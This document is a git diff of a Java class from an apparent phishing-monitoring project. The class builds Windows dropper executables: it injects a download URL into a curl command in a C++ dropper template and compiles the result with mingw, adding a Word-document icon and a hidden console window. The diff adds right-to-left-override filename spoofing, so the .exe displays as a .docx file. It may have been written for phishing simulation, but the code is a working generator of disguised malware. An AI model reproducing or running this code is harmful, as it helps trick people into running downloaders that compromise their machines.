@@ -4,8 +4,12 @@ import com.galimimus.phishingmonitor.StartApplication;
 
 import javax.activation.FileDataSource;
 import java.io.*;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
+import java.util.Calendar;
 import java.util.Scanner;
 import java.util.concurrent.Executors;
 import java.util.logging.Level;
@@ -18,14 +22,14 @@ import static com.galimimus.phishingmonitor.helpers.Validation.createToken;
 public class EXEGenerator {
     static final Logger log = Logger.getLogger(StartApplication.class.getName());
 
-    public void EXE_gen(String filename, String url){
+    public void EXE_gen(String filename, String url) {
         System.out.println("EXE_GEN started");
         StringBuilder text = new StringBuilder();
         Pattern pattern = Pattern.compile("URL_DOWNLOAD = \"curl ");
         Scanner scanner = null;
+        SettingsSingleton ss = SettingsSingleton.getInstance();
         try {
-            Path DropperSourcePath = Paths.get("dropper_files/dropper_original.cpp");
-            scanner = new Scanner(new File("/home/galimimus/IdeaProjects/phishingMonitor/dropper_files/dropper-original.cpp"));
+            scanner = new Scanner(new File(ss.getWORKING_DIRECTORY()+"/dropper_files/dropper-original.cpp"));
         } catch (IOException e) {
             log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
             throw new RuntimeException(e);
@@ -36,7 +40,7 @@ public class EXEGenerator {
             tmp = scanner.nextLine();
             System.out.println(tmp);
             matcher.reset(tmp);
-            while(matcher.find()){
+            while (matcher.find()) {
                 StringBuilder sb = new StringBuilder(tmp);
                 sb.insert(matcher.end(), url);
                 tmp = String.valueOf(sb);
@@ -44,21 +48,19 @@ public class EXEGenerator {
             text.append(tmp).append("\n");
         }
         scanner.close();
-        PrintWriter writer = null;
-        Path DropperGeneratedPath = Paths.get("dropper_files/dropper_outs/dropper.cpp");
+        Path DropperGeneratedPath = Paths.get("dropper_files/dropper_outs/dropper" + filename/*.split("\u202e")[0] */+ ".cpp");
         try {
-            writer = new PrintWriter(DropperGeneratedPath.toString());
+            byte[] bt = String.valueOf(text).getBytes();
+            Files.write(DropperGeneratedPath, bt, StandardOpenOption.CREATE);
         } catch (IOException e) {
             log.logp(Level.SEVERE, "EXEGenerator", "EXE_gen", e.toString());
             throw new RuntimeException(e);
         }
-        writer.print(text);
-        writer.close();
-        try {
-            String command = "x86_64-w64-mingw32-g++ "+
-                    DropperGeneratedPath.toAbsolutePath().normalize() +" -o "
-                    +Paths.get("files").toAbsolutePath().normalize()+"/Document_"+filename;
-            System.out.println(command);
+        try {//x86_64-w64-mingw32-g++ dropper.cpp resource.o -o dropi.exe -mwindows -static-libstdc++ -static-libgcc
+
+            String command = ss.getMINGW_COMMAND()+" " +
+                    DropperGeneratedPath.toAbsolutePath().normalize() + " " + Paths.get("dropper_files/resource_docx.o").toAbsolutePath().normalize() + " -o "
+                    + Paths.get("files").toAbsolutePath().normalize() + "/" + filename +"\u202excod.exe" + " -mwindows -static-libstdc++ -static-libgcc";//TODO:удаление промежуточного файла cpp
             readData(Runtime.getRuntime().exec(command));
 
         } catch (IOException e) {
@@ -67,6 +69,7 @@ public class EXEGenerator {
         }
 
     }
+
     private void readData(Process run) {
         String line;
 
@@ -81,8 +84,8 @@ public class EXEGenerator {
                 System.out.println(line);
             }
             outputReader.close();
-            run.waitFor();
-        } catch (IOException | InterruptedException e) {
+
+        } catch (IOException e) {
             throw new RuntimeException(e);
         }
     }
